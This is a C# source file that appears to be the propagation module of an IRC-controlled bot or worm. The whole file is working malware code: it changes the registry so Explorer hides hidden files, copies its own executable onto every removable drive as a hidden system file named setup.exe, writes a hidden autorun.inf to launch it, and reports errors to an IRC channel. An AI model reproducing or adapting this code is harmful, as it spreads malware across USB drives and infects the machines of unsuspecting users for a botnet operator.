using System;
using System.Text;
using System.IO;

namespace mstsc.Aries.Commands
{
sealed class Spread
    {
        public Spread()
        {
            try
            {
                try
                {//Hide hidden files from view
                    Microsoft.Win32.Registry.CurrentUser.SetValue(
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
                        '0', Microsoft.Win32.RegistryValueKind.DWord);
                }
                catch (Exception) { }

                foreach (DriveInfo Drive in DriveInfo.GetDrives())
                {
                    if ((Drive.DriveType == DriveType.Removable) & (Drive.IsReady))
                    {
                        string fname = "setup.exe";
                        if (File.Exists(Drive.Name + "setup.exe")) { fname = "setup_.exe"; }
                        if (File.Exists(Drive.Name + "autorun.inf")) { File.Delete(Drive.Name + "autorun.inf"); }
                        File.Copy(System.Windows.Forms.Application.ExecutablePath, Drive.Name + fname);
                        StreamWriter writer2 = new StreamWriter(Drive.Name + "autorun.inf", false, Encoding.Default);
                        writer2.Write("[autorun]\nopen=" + fname);
                        writer2.Flush();
                        writer2.Close();
                        File.SetAttributes(Drive.Name + fname, FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
                        File.SetAttributes(Drive.Name + "autorun.inf", FileAttributes.System | FileAttributes.Hidden);
                    }
                }
            }
            catch (Exception Exception)
            {
                try { Main.Instance.IRCClient.MessageCurrentChannel("{Spread} An error has occurred: " + Exception.Message); }
                catch { }
            }
        }
    }
}
